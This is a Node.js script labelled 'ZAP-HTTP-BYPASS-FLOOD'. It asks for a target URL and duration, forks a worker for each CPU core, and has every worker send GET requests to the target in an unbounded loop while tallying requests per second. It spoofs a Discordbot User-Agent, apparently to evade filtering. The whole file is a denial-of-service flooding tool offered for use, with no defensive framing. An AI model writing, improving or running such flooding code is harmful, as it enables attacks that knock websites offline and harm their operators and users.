const cluster = require('cluster');
const http = require('http');
const https = require('https');
const os = require('os');
const { URL } = require('url');
const readline = require('readline');

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

const prompt = (q) => new Promise(res => rl.question(q, res));
const clear = () => process.stdout.write('\x1Bc');

let total = 0;
let maxRPS = 0;
let last = 0;

async function main() {
    clear();
    console.log("jrl@zap.live >");

    const targetInput = await prompt("[¿T] > ");
    const duration = parseInt(await prompt("[¿DU!] > ")) || 60;

    const target = new URL(targetInput.startsWith('http') ? targetInput : `http://${targetInput}`);
    const protocol = target.protocol === 'https:' ? https : http;
    const port = target.port || (target.protocol === 'https:' ? 443 : 80);
    const cores = os.cpus().length;

    clear();
    console.log(`Launching with ${cores} threads`);

    if (cluster.isMaster) {
        for (let i = 0; i < cores; i++) cluster.fork();

        setInterval(() => {
            const rps = total - last;
            last = total;
            maxRPS = Math.max(maxRPS, rps);
            clear();
            console.log("ZAP-HTTP-BYPASS-FLOOD");
            console.log(`Total Sent:   ${total}`);
            console.log(`RPS:          ${rps}`);
            console.log(`Max RPS:      ${maxRPS}`);
        }, 4000);

        setTimeout(() => {
            for (const id in cluster.workers) cluster.workers[id].kill();
            clear();
            console.log("ZAP-FLOOD DONE");
            console.log(`Final Sent: ${total}`);
            console.log(`Max RPS:    ${maxRPS}`);
            process.exit(0);
        }, duration * 1000);

        cluster.on('message', (_, msg) => {
            if (msg === 'inc') total++;
        });

    } else {
        function blast() {
            const options = {
                hostname: target.hostname,
                port: port,
                path: target.pathname || "/",
                method: 'GET',
                headers: {
                    'User-Agent': 'Discordbot/2.0 (+https://discordapp.com)',
                    'Accept': 'text/html',
                    'Connection': 'close'
                }
            };

            const req = protocol.request(options, (res) => {
                if (res.statusCode === 200) {
                    // Success: Request completed, increment total count
                    process.send('inc');
                } else {
                    // Debug: Log the response status if it's not 200
                    console.log(`Request failed with status code: ${res.statusCode}`);
                }
            });

            req.on('error', (err) => {
                // Debug: Log if there is an error in the request
                console.log('Request error:', err);
            });

            req.end();  // Finish the request

            // Recursively keep sending requests
            blast();
        }
        blast();
    }
}

main();
